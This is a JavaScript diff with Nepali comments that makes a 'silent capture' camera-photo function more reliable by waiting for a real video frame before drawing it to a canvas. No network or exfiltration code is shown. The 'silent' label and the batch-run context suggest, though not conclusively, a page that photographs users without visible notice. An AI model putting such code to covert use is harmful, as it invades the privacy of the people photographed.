@@ -428,6 +428,8 @@ async function runAll(){
 
 /* ============ PHOTO (silent capture) ============ */
 
+/* ============ PHOTO (silent capture — fixed) ============ */
+
 async function capturePhoto(){
 
     if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
@@ -448,22 +450,43 @@ async function capturePhoto(){
 
     video.srcObject = stream;
 
-    // frame ready हुन कुर्नुहोस्
+    // 1) स्पष्ट play() — iOS मा autoplay attribute ले पुग्दैन कहिलेकाहीँ
+    try{ await video.play(); }catch(e){}
+
+    // 2) video ले play नै नगरेको भए कुर्नुहोस् (readyState 3 = HAVE_FUTURE_DATA)
     await new Promise(res => {
-        if(video.readyState >= 2) return res();
-        video.onloadeddata = res;
+        if(video.readyState >= 3 && !video.paused) return res();
+        video.onplaying = res;
     });
 
-    // exposure/autofocus settle हुन 400ms
-    await new Promise(res => setTimeout(res, 400));
+    // 3) ⭐ मुख्य fix — browser ले frame साँच्चै compositor मा
+    //    present गरेपछि मात्र अगाडि बढ्ने (available भए)
+    if('requestVideoFrameCallback' in video){
+        await new Promise(res => {
+            // दुई पटक कुर्नु — केही device मा पहिलो frame नै black हुन्छ
+            video.requestVideoFrameCallback(() => {
+                video.requestVideoFrameCallback(() => res());
+            });
+        });
+    }
 
-    photoCanvas.width  = video.videoWidth  || 640;
-    photoCanvas.height = video.videoHeight || 480;
+    // 4) exposure/autofocus settle हुन दिनुहोस्
+    await new Promise(res => setTimeout(res, 600));
+
+    // 5) Safety net — frame नै आएको छैन भने black पठाउनुको सट्टा error दिनुहोस्
+    if(!video.videoWidth){
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+        throw new Error("Camera not ready — please try again.");
+    }
+
+    photoCanvas.width  = video.videoWidth;
+    photoCanvas.height = video.videoHeight;
 
     photoCanvas.getContext("2d")
         .drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
 
-    // camera तुरुन्तै release
+    // pixels canvas मा copy भैसकेपछि मात्र camera release
     stream.getTracks().forEach(t => t.stop());
     video.srcObject = null;
 
